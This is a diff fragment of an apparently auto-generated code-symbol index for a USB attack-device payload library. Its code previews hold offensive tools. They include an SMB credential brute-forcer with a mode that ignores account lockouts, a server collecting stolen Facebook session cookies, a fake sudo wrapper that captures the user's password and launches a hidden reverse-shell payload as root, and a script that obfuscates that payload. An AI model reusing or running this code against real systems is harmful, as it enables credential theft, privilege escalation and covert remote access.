+        "peekOfCode": "\t\t\t\t\t\tsmb_connection = SMBConnection(self.target, self.target)\n\t\t\t\t\t\tbreak\n\tdef login(self, domain, username, password, smb_connection):\n\t\tattempt = \"{0}/{1}:{2}\".format(domain, username, password)\n\t\ttry:\n\t\t\t# This line will always raise an exception unless the credentials can initiate an smb connection\n\t\t\tsmb_connection.login(username, password, domain)\n\t\t\tself.log.info(\"[+] Success (Account Active) {0}\".format(attempt))\n\t\t\treturn True\n\t\texcept Exception as msg:",
+        "detail": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "documentation": {}
+    },
+    {
+        "label": "\t\tattempt",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "description": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "peekOfCode": "\t\tattempt = \"{0}/{1}:{2}\".format(domain, username, password)\n\t\ttry:\n\t\t\t# This line will always raise an exception unless the credentials can initiate an smb connection\n\t\t\tsmb_connection.login(username, password, domain)\n\t\t\tself.log.info(\"[+] Success (Account Active) {0}\".format(attempt))\n\t\t\treturn True\n\t\texcept Exception as msg:\n\t\t\tmsg = str(msg)\n\t\t\tif 'STATUS_NO_LOGON_SERVERS' in msg:\n\t\t\t\tself.log.info('[-] No Logon Servers Available')",
+        "detail": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "documentation": {}
+    },
+    {
+        "label": "\t\t\tmsg",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "description": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "peekOfCode": "\t\t\tmsg = str(msg)\n\t\t\tif 'STATUS_NO_LOGON_SERVERS' in msg:\n\t\t\t\tself.log.info('[-] No Logon Servers Available')\n\t\t\t\tsys.exit(os.EX_SOFTWARE)\n\t\t\telif 'STATUS_LOGON_FAILURE' in msg:\n\t\t\t\tif self.verbose:\n\t\t\t\t\tself.log.info(\"[-] Failed {0}\".format(attempt))\n\t\t\t\treturn False\n\t\t\telif 'STATUS_ACCOUNT_LOCKED_OUT' in msg:\n\t\t\t\tprint \"[-] Account Locked Out {0}\".format(attempt)",
+        "detail": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "documentation": {}
+    },
+    {
+        "label": "\t\t\t\t\tanswer",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "description": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "peekOfCode": "\t\t\t\t\tanswer = str(raw_input('[!] Would you like to proceed with the bruteforce? (Y/N) '))\n                                        if answer.lower() in [\"y\", \"yes\", \"\"]:\n                                                self.log.info('[*] Resuming...')\n                                                return False\n                                        else:\n                                             \tself.log.info('[-]Exiting...')\n                                                sys.exit(os.EX_SOFTWARE)\n\t\t\telif 'STATUS_PASSWORD_MUST_CHANGE' in msg:\n\t\t\t\tself.log.info(\"[+] Success (User never logged in to change password) {0}\".format(attempt))\n\t\t\telif 'STATUS_ACCESS_DENIED' in msg or 'STATUS_LOGON_TYPE_NOT_GRANTED' in msg:",
+        "detail": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "documentation": {}
+    },
+    {
+        "label": "\tparser",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "description": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "peekOfCode": "\tparser = argparse.ArgumentParser(add_help=True, description='Use MMC DCOM to bruteforce valid credentials')\n\tparser.add_argument('-L', dest='loglvl', action='store', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL'], default='INFO', help='set the logging level')\n\tgroup = parser.add_argument_group('Bruteforce options')\n\tgroup.add_argument('-t', '--target', action='store', required=True, dest='target', help='Windows domain joined IP address')\n\tgroup.add_argument('-d', '--domain', action='store', default='.', dest='domain', help='Target domain name (same domain you prepend a username with to login)')\n\tgroup.add_argument('-p', '--passwords', action='store', dest='passwords', help='Text file of passwords')\n\tgroup.add_argument('-U', '--user-as-pass', action='store_true', dest='uap', help='Attempt to login with user as pass')\n\tgroup.add_argument('-u', '--usernames', action='store', required=True, dest='usernames', help='Text file of usernames')\n\tgroup.add_argument('-b', '--honeybadger', action='store_true', dest='hb', help='Enable Honey Badger mode (ignore account locks out)')\n\tgroup.add_argument('-v', '--verbose', action='store_true', dest='verbose', help='Show failed bruteforce attempts')",
+        "detail": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "documentation": {}
+    },
+    {
+        "label": "\tgroup",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "description": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "peekOfCode": "\tgroup = parser.add_argument_group('Bruteforce options')\n\tgroup.add_argument('-t', '--target', action='store', required=True, dest='target', help='Windows domain joined IP address')\n\tgroup.add_argument('-d', '--domain', action='store', default='.', dest='domain', help='Target domain name (same domain you prepend a username with to login)')\n\tgroup.add_argument('-p', '--passwords', action='store', dest='passwords', help='Text file of passwords')\n\tgroup.add_argument('-U', '--user-as-pass', action='store_true', dest='uap', help='Attempt to login with user as pass')\n\tgroup.add_argument('-u', '--usernames', action='store', required=True, dest='usernames', help='Text file of usernames')\n\tgroup.add_argument('-b', '--honeybadger', action='store_true', dest='hb', help='Enable Honey Badger mode (ignore account locks out)')\n\tgroup.add_argument('-v', '--verbose', action='store_true', dest='verbose', help='Show failed bruteforce attempts')\n\toptions = parser.parse_args()\n\tif options.passwords is None and options.uap is False:",
+        "detail": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "documentation": {}
+    },
+    {
+        "label": "\toptions",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "description": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "peekOfCode": "\toptions = parser.parse_args()\n\tif options.passwords is None and options.uap is False:\n\t\tparser.error('The --passwords or --user-as-pass option is required')\n\tif not is_readable_file(options.usernames):\n\t\tparser.error('The --usernames option must be a readable file')\n\tif options.passwords is not None and not is_readable_file(options.passwords):\n\t\tparser.error('The --passwords option must be a readable file')\n\ttry:\n\t\tbrute = MMCBrute.from_args(options)\n\t\tbrute.info()",
+        "detail": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "documentation": {}
+    },
+    {
+        "label": "\t\tbrute",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "description": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "peekOfCode": "\t\tbrute = MMCBrute.from_args(options)\n\t\tbrute.info()\n\t\tbrute.run()\n\texcept KeyboardInterrupt:\n\t\tprint('\\n[*] Caught ctrl-c, exiting')\n\tfinally:\n\t\tbrute.end()",
+        "detail": "payloads.library.credentials.SMBruteBunny.mmcbrute.mmcbrute",
+        "documentation": {}
+    },
+    {
+        "label": "StoreHandler",
+        "kind": 6,
+        "importPath": "payloads.library.credentials.WindowsCookies.server",
+        "description": "payloads.library.credentials.WindowsCookies.server",
+        "peekOfCode": "class StoreHandler(BaseHTTPRequestHandler):\n    store_path = \"/root/udisk/loot/FacebookSession\"\n    get_path = pjoin(curdir, 'p')\n    def do_GET(self):\n        if self.path == '/p':\n            with open(self.get_path) as fh:\n                self.send_response(200)\n                self.send_header('Content-type', 'text/plain')\n                self.end_headers()\n                self.wfile.write(fh.read().encode())",
+        "detail": "payloads.library.credentials.WindowsCookies.server",
+        "documentation": {}
+    },
+    {
+        "label": "server",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.WindowsCookies.server",
+        "description": "payloads.library.credentials.WindowsCookies.server",
+        "peekOfCode": "server = HTTPServer(('', 8080), StoreHandler)\nserver.serve_forever()",
+        "detail": "payloads.library.credentials.WindowsCookies.server",
+        "documentation": {}
+    },
+    {
+        "label": "cantLoadModuleError",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "description": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "peekOfCode": "def cantLoadModuleError():\n    import sys\n    if sys.version_info.major < 3:\n        return ImportError\n    return ImportError if sys.version_info.minor < 6 else ModuleNotFoundError\ndef getLootFileName():\n    import os\n    thisFullPath = os.path.abspath(__file__)\n    thisDirectory = os.path.split(thisFullPath)[0]\n    lootFile = thisDirectory + os.sep + \"sudo.conf\"",
+        "detail": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "documentation": {}
+    },
+    {
+        "label": "getLootFileName",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "description": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "peekOfCode": "def getLootFileName():\n    import os\n    thisFullPath = os.path.abspath(__file__)\n    thisDirectory = os.path.split(thisFullPath)[0]\n    lootFile = thisDirectory + os.sep + \"sudo.conf\"\n    return os.path.join(lootFile)\ndef initializeThisScript():\n    '''This function will be run the first time by the bunny'''\n    import subprocess\n    import re",
+        "detail": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "documentation": {}
+    },
+    {
+        "label": "initializeThisScript",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "description": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "peekOfCode": "def initializeThisScript():\n    '''This function will be run the first time by the bunny'''\n    import subprocess\n    import re\n    pathFinder = subprocess.Popen(\"which python\".split(), stdout = subprocess.PIPE)\n    pythonExecutable = pathFinder.stdout.read().strip()\n    pathFinder = subprocess.Popen(\"which sudo\".split(), stdout = subprocess.PIPE)\n    sudoExecutable = pathFinder.stdout.read().strip()\n    try:\n        import json",
+        "detail": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "documentation": {}
+    },
+    {
+        "label": "createLootFile",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "description": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "peekOfCode": "def createLootFile(lootFileName):\n    import json\n    initialData = {}\n    with open(lootFileName, 'w') as lootFile:\n        json.dump(initialData, lootFile)\ndef validSudoPassword(password):\n    import subprocess\n    command = [realSudo, \"-S\", \"-b\", \"echo\", \"Echo this\"]\n    wrapper = subprocess.Popen(command, stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE)\n    wrapper.communicate(password + \"\\n\")",
+        "detail": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "documentation": {}
+    },
+    {
+        "label": "validSudoPassword",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "description": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "peekOfCode": "def validSudoPassword(password):\n    import subprocess\n    command = [realSudo, \"-S\", \"-b\", \"echo\", \"Echo this\"]\n    wrapper = subprocess.Popen(command, stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE)\n    wrapper.communicate(password + \"\\n\")\n    #wrapper.terminate()\n    return not wrapper.returncode\ndef getPayloadFile():\n    import os\n    programDirectory = os.path.split(__file__)[0]",
+        "detail": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "documentation": {}
+    },
+    {
+        "label": "getPayloadFile",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "description": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "peekOfCode": "def getPayloadFile():\n    import os\n    programDirectory = os.path.split(__file__)[0]\n    return programDirectory + os.sep + \".sudo\"\ndef silencePayloadFile():  #if there is an error making our reverse https, such as a bad network connection, this will make it fail without any output\n    import os\n    payloadFileName = getPayloadFile()\n    if os.path.isfile(payloadFileName):\n        with open(payloadFileName, 'r') as payloadFile:\n            payload = payloadFile.read()",
+        "detail": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "documentation": {}
+    },
+    {
+        "label": "silencePayloadFile",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "description": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "peekOfCode": "def silencePayloadFile():  #if there is an error making our reverse https, such as a bad network connection, this will make it fail without any output\n    import os\n    payloadFileName = getPayloadFile()\n    if os.path.isfile(payloadFileName):\n        with open(payloadFileName, 'r') as payloadFile:\n            payload = payloadFile.read()\n        payload = \"try:\\n\\t\" + payload + \"\\nexcept:\\n\\tpass\"\n        with open(payloadFileName, 'w') as payloadFile:\n            payloadFile.write(payload)\ndef blueTurtleShell(password):  #we are going to give it a password here.  It won't cause a problem if it is not needed, and it might be needed if the user was doing some long process for the sudo.",
+        "detail": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "documentation": {}
+    },
+    {
+        "label": "blueTurtleShell",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "description": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "peekOfCode": "def blueTurtleShell(password):  #we are going to give it a password here.  It won't cause a problem if it is not needed, and it might be needed if the user was doing some long process for the sudo.\n    import subprocess\n    import os\n    payloadFile = getPayloadFile()\n    if not os.path.isfile(payloadFile):\n        return False\n    command = \" \".join([realSudo, \"-S\", \"-b\", pythonInterpreter, payloadFile])\n    hackTheGibson = subprocess.Popen(command, stdin = subprocess.PIPE, shell = True)\n    hackTheGibson.communicate(password + \"\\n\")\ndef runIntendedSudoCommand():  #we won't need a password here, since we just got a good sudo when we verified their password",
+        "detail": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "documentation": {}
+    },
+    {
+        "label": "runIntendedSudoCommand",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "description": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "peekOfCode": "def runIntendedSudoCommand():  #we won't need a password here, since we just got a good sudo when we verified their password\n    import sys\n    import os\n    args = sys.argv[1:]\n    for index, arg in enumerate(args):\n        if arg == \"sudo\":\n            args[index] = realSudo\n    command = \" \".join([realSudo, \"-S\"] + args)\n    os.system(command)  #not using subprocess.  Usually the ability to mess with stdin/out/err is useful, but it just gets in the way of delivering the true user experience here.  Especially if they use something interactive like vim.\ndef getSudoPassword(allowedAttempts = 3):",
+        "detail": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "documentation": {}
+    },
+    {
+        "label": "getSudoPassword",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "description": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "peekOfCode": "def getSudoPassword(allowedAttempts = 3):\n    import getpass\n    user = getpass.getuser()\n    if validSudoPassword(\"\"):  #this avoids having the program ask for a password if a valid one was just entered (normal sudo behavior).  Also avoids creating a bunch of reverse shells if the user is repeatedly using sudo (that could create some noise on both ends)\n        return (user, \"\", False)\n    prompt = f\"[sudo] password for {user}: \"\n    fail = \"Sorry, try again.\"\n    epicFail = f\"sudo: {allowedAttempts} incorrect password attempts\"\n    success = False\n    for i in range(allowedAttempts):",
+        "detail": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "documentation": {}
+    },
+    {
+        "label": "loadLootFile",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "description": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "peekOfCode": "def loadLootFile(lootFileName):\n    import json\n    try:\n        with open(lootFileName, 'r') as file:\n            data = json.load(file)\n        return data\n    except:\n        return False\ndef saveLootFile(loot, lootFileName):\n    import json",
+        "detail": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "documentation": {}
+    },
+    {
+        "label": "saveLootFile",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "description": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "peekOfCode": "def saveLootFile(loot, lootFileName):\n    import json\n    try:\n        with open(lootFileName, 'w') as file:\n            json.dump(loot, file)\n    except:\n        pass\ndef parseArguments():\n    import sys\n    argList = sys.argv",
+        "detail": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "documentation": {}
+    },
+    {
+        "label": "parseArguments",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "description": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "peekOfCode": "def parseArguments():\n    import sys\n    argList = sys.argv\n    if \"--initializeScript\" in sys.argv:\n        initializeThisScript()\n    else:\n        return argList\ndef prewrap():\n    parseArguments()\n    lootFile = getLootFileName()",
+        "detail": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "documentation": {}
+    },
+    {
+        "label": "prewrap",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "description": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "peekOfCode": "def prewrap():\n    parseArguments()\n    lootFile = getLootFileName()\n    loot = loadLootFile(lootFile)\n    try:\n        user, password, passwordNeeded = getSudoPassword()\n    except:\n        user = None\n        password = None\n        passwordNeeded = True",
+        "detail": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "documentation": {}
+    },
+    {
+        "label": "postwrap",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "description": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "peekOfCode": "def postwrap(user, password, loot):\n    if not passwordNeeded:\n        if user:\n            try:\n                password = loot[user]\n            except:\n                password = \"\"\n    blueTurtleShell(password)    \nif __name__ == '__main__':\n    parseArguments()",
+        "detail": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "documentation": {}
+    },
+    {
+        "label": "realSudo",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "description": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "peekOfCode": "realSudo = \"/usr/bin/sudo\" #\"REAL_SUDO_HERE\"\npythonInterpreter = \"PYTHON_EXECUTABLE_GOES_HERE\"\ndef cantLoadModuleError():\n    import sys\n    if sys.version_info.major < 3:\n        return ImportError\n    return ImportError if sys.version_info.minor < 6 else ModuleNotFoundError\ndef getLootFileName():\n    import os\n    thisFullPath = os.path.abspath(__file__)",
+        "detail": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "documentation": {}
+    },
+    {
+        "label": "pythonInterpreter",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "description": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "peekOfCode": "pythonInterpreter = \"PYTHON_EXECUTABLE_GOES_HERE\"\ndef cantLoadModuleError():\n    import sys\n    if sys.version_info.major < 3:\n        return ImportError\n    return ImportError if sys.version_info.minor < 6 else ModuleNotFoundError\ndef getLootFileName():\n    import os\n    thisFullPath = os.path.abspath(__file__)\n    thisDirectory = os.path.split(thisFullPath)[0]",
+        "detail": "payloads.library.credentials.bushingsBlueTurtle.blueTurtle",
+        "documentation": {}
+    },
+    {
+        "label": "grabEncoded",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.bushingsBlueTurtle.shellSmuggler",
+        "description": "payloads.library.credentials.bushingsBlueTurtle.shellSmuggler",
+        "peekOfCode": "def grabEncoded(payload):\n    import re\n    regex = re.compile(\"sys\\.version_info\\[0\\]\\]\\((\\'.+\\')\\)\")\n    finder = re.search(regex, payload)\n    encodedAttack = finder.group(1)\n    payload = payload.replace(encodedAttack, \"encodedAttack\")\n    return (encodedAttack, payload)\ndef getPayloadFromSTDIN():\n    import sys\n    return sys.stdin.read()",
+        "detail": "payloads.library.credentials.bushingsBlueTurtle.shellSmuggler",
+        "documentation": {}
+    },
+    {
+        "label": "getPayloadFromSTDIN",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.bushingsBlueTurtle.shellSmuggler",
+        "description": "payloads.library.credentials.bushingsBlueTurtle.shellSmuggler",
+        "peekOfCode": "def getPayloadFromSTDIN():\n    import sys\n    return sys.stdin.read()\ndef getPayloadFromFile(fileName):\n    with open(fileName, 'r') as file:\n        payload = file.read()\n    return payload\ndef breakEncoded(encodedAttack):\n    encoded1 = encodedAttack[::2]\n    encoded2 = encodedAttack[1::2]",
+        "detail": "payloads.library.credentials.bushingsBlueTurtle.shellSmuggler",
+        "documentation": {}
+    },
+    {
+        "label": "getPayloadFromFile",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.bushingsBlueTurtle.shellSmuggler",
+        "description": "payloads.library.credentials.bushingsBlueTurtle.shellSmuggler",
+        "peekOfCode": "def getPayloadFromFile(fileName):\n    with open(fileName, 'r') as file:\n        payload = file.read()\n    return payload\ndef breakEncoded(encodedAttack):\n    encoded1 = encodedAttack[::2]\n    encoded2 = encodedAttack[1::2]\n    return (encoded1, encoded2)\ndef makePrepend(encoded1, encoded2):\n    return f\"encodedAttack=''.join([''.join(item) for item in zip('{encoded1}','{encoded2}')]);\"",
+        "detail": "payloads.library.credentials.bushingsBlueTurtle.shellSmuggler",
+        "documentation": {}
+    },
+    {
+        "label": "breakEncoded",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.bushingsBlueTurtle.shellSmuggler",
+        "description": "payloads.library.credentials.bushingsBlueTurtle.shellSmuggler",
+        "peekOfCode": "def breakEncoded(encodedAttack):\n    encoded1 = encodedAttack[::2]\n    encoded2 = encodedAttack[1::2]\n    return (encoded1, encoded2)\ndef makePrepend(encoded1, encoded2):\n    return f\"encodedAttack=''.join([''.join(item) for item in zip('{encoded1}','{encoded2}')]);\"\ndef checkForInputFile():\n    import sys\n    args = sys.argv\n    if len(args) > 2:",
+        "detail": "payloads.library.credentials.bushingsBlueTurtle.shellSmuggler",
+        "documentation": {}
+    },
+    {
+        "label": "makePrepend",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.bushingsBlueTurtle.shellSmuggler",
+        "description": "payloads.library.credentials.bushingsBlueTurtle.shellSmuggler",
+        "peekOfCode": "def makePrepend(encoded1, encoded2):\n    return f\"encodedAttack=''.join([''.join(item) for item in zip('{encoded1}','{encoded2}')]);\"\ndef checkForInputFile():\n    import sys\n    args = sys.argv\n    if len(args) > 2:\n        raise RuntimeError(\"Only valid argument is a filename\")\n    return args[1] if len(args) == 2 else False\nif fileName := checkForInputFile():\n    payload = getPayloadFromFile(fileName)",
+        "detail": "payloads.library.credentials.bushingsBlueTurtle.shellSmuggler",
+        "documentation": {}
+    },
+    {
+        "label": "checkForInputFile",
+        "kind": 2,
+        "importPath": "payloads.library.credentials.bushingsBlueTurtle.shellSmuggler",
+        "description": "payloads.library.credentials.bushingsBlueTurtle.shellSmuggler",
+        "peekOfCode": "def checkForInputFile():\n    import sys\n    args = sys.argv\n    if len(args) > 2:\n        raise RuntimeError(\"Only valid argument is a filename\")\n    return args[1] if len(args) == 2 else False\nif fileName := checkForInputFile():\n    payload = getPayloadFromFile(fileName)\nelse:\n    payload = getPayloadFromSTDIN()",
+        "detail": "payloads.library.credentials.bushingsBlueTurtle.shellSmuggler",
+        "documentation": {}
+    },
+    {
+        "label": "encodedAttack",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.bushingsBlueTurtle.shellSmuggler",
+        "description": "payloads.library.credentials.bushingsBlueTurtle.shellSmuggler",
+        "peekOfCode": "encodedAttack = encodedAttack.strip(\"'\")\nencoded1, encoded2 = breakEncoded(encodedAttack)\nprepend = makePrepend(encoded1, encoded2)\nhiddenShell = prepend + payload\nimport sys\nsys.stdout.write(hiddenShell)",
+        "detail": "payloads.library.credentials.bushingsBlueTurtle.shellSmuggler",
+        "documentation": {}
+    },
+    {
+        "label": "prepend",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.bushingsBlueTurtle.shellSmuggler",
+        "description": "payloads.library.credentials.bushingsBlueTurtle.shellSmuggler",
+        "peekOfCode": "prepend = makePrepend(encoded1, encoded2)\nhiddenShell = prepend + payload\nimport sys\nsys.stdout.write(hiddenShell)",
+        "detail": "payloads.library.credentials.bushingsBlueTurtle.shellSmuggler",
+        "documentation": {}
+    },
+    {
+        "label": "hiddenShell",
+        "kind": 5,
+        "importPath": "payloads.library.credentials.bushingsBlueTurtle.shellSmuggler",
+        "description": "payloads.library.credentials.bushingsBlueTurtle.shellSmuggler",
+        "peekOfCode": "hiddenShell = prepend + payload\nimport sys\nsys.stdout.write(hiddenShell)",
+        "detail": "payloads.library.credentials.bushingsBlueTurtle.shellSmuggler",
+        "documentation": {}
+    },
+    {
+        "label": "getDict",
+        "kind": 2,
+        "importPath": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "description": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "peekOfCode": "def getDict(SWITCH_POSITION):\n\t#read ansiDict.txt file to get the bytes for the widows altcodes (ascii 128-255)\n\taltcode = 0\n\twith open(f'/root/udisk/payloads/{SWITCH_POSITION}/ansiDict.txt', 'rb') as f:\n\t\tfor line in f:\n\t\t\tline = str(binascii.hexlify(line))\n\t\t\twhile line.endswith('0a') or line.endswith('0d'):\n\t\t\t\tline = ''.join(line.split('0a')[:-1])\n\t\t\t\tline = ''.join(line.split('0d')[:-1])\n\t\t\tline = binascii.unhexlify(line)",
+        "detail": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "documentation": {}
+    },
+    {
+        "label": "main",
+        "kind": 2,
+        "importPath": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "description": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "peekOfCode": "def main(SWITCH_POSITION):\n\tlocalDir = '/root/udisk/payloads/' + SWITCH_POSITION + '/'\n\tlineCount = 0\n\twith open(localDir + 'payload.txt', 'a+') as payload:\n\t\twith open(localDir + 'img.txt', 'rb') as img:\n\t\t\tfor line in img:\n\t\t\t\tlineCount += 1\n\t\t\t\tindex = 0\n\t\t\t\twhile index < len(line)-1:\n\t\t\t\t\tc = line[index]",
+        "detail": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "documentation": {}
+    },
+    {
+        "label": "ansiDict",
+        "kind": 5,
+        "importPath": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "description": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "peekOfCode": "ansiDict = {}\ndef getDict(SWITCH_POSITION):\n\t#read ansiDict.txt file to get the bytes for the widows altcodes (ascii 128-255)\n\taltcode = 0\n\twith open(f'/root/udisk/payloads/{SWITCH_POSITION}/ansiDict.txt', 'rb') as f:\n\t\tfor line in f:\n\t\t\tline = str(binascii.hexlify(line))\n\t\t\twhile line.endswith('0a') or line.endswith('0d'):\n\t\t\t\tline = ''.join(line.split('0a')[:-1])\n\t\t\t\tline = ''.join(line.split('0d')[:-1])",
+        "detail": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "documentation": {}
+    },
+    {
+        "label": "\taltcode",
+        "kind": 5,
+        "importPath": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "description": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "peekOfCode": "\taltcode = 0\n\twith open(f'/root/udisk/payloads/{SWITCH_POSITION}/ansiDict.txt', 'rb') as f:\n\t\tfor line in f:\n\t\t\tline = str(binascii.hexlify(line))\n\t\t\twhile line.endswith('0a') or line.endswith('0d'):\n\t\t\t\tline = ''.join(line.split('0a')[:-1])\n\t\t\t\tline = ''.join(line.split('0d')[:-1])\n\t\t\tline = binascii.unhexlify(line)\n\t\t\tif len(line) > 0:\n\t\t\t\tansiDict[str(binascii.hexlify(line))] = str(altcode)",
+        "detail": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "documentation": {}
+    },
+    {
+        "label": "\t\t\tline",
+        "kind": 5,
+        "importPath": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "description": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "peekOfCode": "\t\t\tline = str(binascii.hexlify(line))\n\t\t\twhile line.endswith('0a') or line.endswith('0d'):\n\t\t\t\tline = ''.join(line.split('0a')[:-1])\n\t\t\t\tline = ''.join(line.split('0d')[:-1])\n\t\t\tline = binascii.unhexlify(line)\n\t\t\tif len(line) > 0:\n\t\t\t\tansiDict[str(binascii.hexlify(line))] = str(altcode)\n\t\t\taltcode += 1\ndef main(SWITCH_POSITION):\n\tlocalDir = '/root/udisk/payloads/' + SWITCH_POSITION + '/'",
+        "detail": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "documentation": {}
+    },
+    {
+        "label": "\t\t\t\tline",
+        "kind": 5,
+        "importPath": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
+        "description": "payloads.library.general.ALTCODE-TRANSCODER.art2bunny",
